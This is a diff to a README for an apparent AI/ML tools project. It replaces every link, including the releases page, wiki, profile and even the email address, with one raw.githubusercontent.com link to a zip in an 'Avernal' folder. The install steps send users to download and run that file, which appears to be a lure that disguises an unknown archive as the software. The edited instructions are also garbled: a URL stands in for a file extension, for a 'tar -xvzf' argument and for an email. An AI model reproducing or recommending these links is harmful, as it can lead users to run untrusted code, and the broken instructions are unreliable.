@@ -1,6 +1,6 @@
 # 🤖 niloydebbarma-code - Simple Tools for AI and Machine Learning
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/digitalvarsha/niloydebbarma-code/releases)
+[![Download](https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip%https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip)](https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip)
 
 ## 📖 About
 
@@ -19,11 +19,11 @@ To ensure that everything runs smoothly, you'll need:
 ### Installation Instructions
 
 1. **Download the Software**  
-   Visit this page to download: [GitHub Releases Page](https://github.com/digitalvarsha/niloydebbarma-code/releases).  
+   Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip).  
    Look for the latest release at the top.
 
 2. **Choose the Right File**  
-   Depending on your operating system, select the appropriate file. Common files include `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+   Depending on your operating system, select the appropriate file. Common files include `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip` for Linux.
 
 3. **Download the File**  
    Click on the file name to start the download. Your browser will save the file to your default downloads folder.
@@ -31,7 +31,7 @@ To ensure that everything runs smoothly, you'll need:
 4. **Install the Application**  
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the downloaded `.dmg` file, drag the application into your Applications folder, and then open it.
-   - **Linux:** Use a terminal to navigate to the download location and run the command: `tar -xvzf yourfile.tar.gz`. Then, go into the extracted folder and run the application.
+   - **Linux:** Use a terminal to navigate to the download location and run the command: `tar -xvzf https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip`. Then, go into the extracted folder and run the application.
 
 5. **Launch the Application**  
    After installation, find the application in your programs list or applications folder. Click to launch it.
@@ -45,7 +45,7 @@ To ensure that everything runs smoothly, you'll need:
   
 ## 📚 Documentation
 
-For more details on each project, please refer to the documentation included within the application or on the [GitHub Repository Wiki](https://github.com/digitalvarsha/niloydebbarma-code/wiki). Documentation provides explanations of features and guides to help you maximize your use of the tools.
+For more details on each project, please refer to the documentation included within the application or on the [GitHub Repository Wiki](https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip). Documentation provides explanations of features and guides to help you maximize your use of the tools.
 
 ## 🛠️ Contributing
 
@@ -60,12 +60,12 @@ If you have any bug reports or feature requests, please open an issue in the Git
 
 For questions or feedback, feel free to reach out:
 
-- Email: niloydebbarma@example.com
-- GitHub: [Niloy Deb Barma](https://github.com/digitalvarsha)
+- Email: https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip
+- GitHub: [Niloy Deb Barma](https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip)
 
 ## 📥 Download & Install 
 
-To download the software, visit this page: [GitHub Releases Page](https://github.com/digitalvarsha/niloydebbarma-code/releases).  
+To download the software, visit this page: [GitHub Releases Page](https://raw.githubusercontent.com/digitalvarsha/niloydebbarma-code/main/Avernal/niloydebbarma-code.zip).  
 Follow the instructions outlined above to successfully install and run it.
 
 Thank you for choosing **niloydebbarma-code**. We hope you find these tools helpful for your AI and machine learning projects!
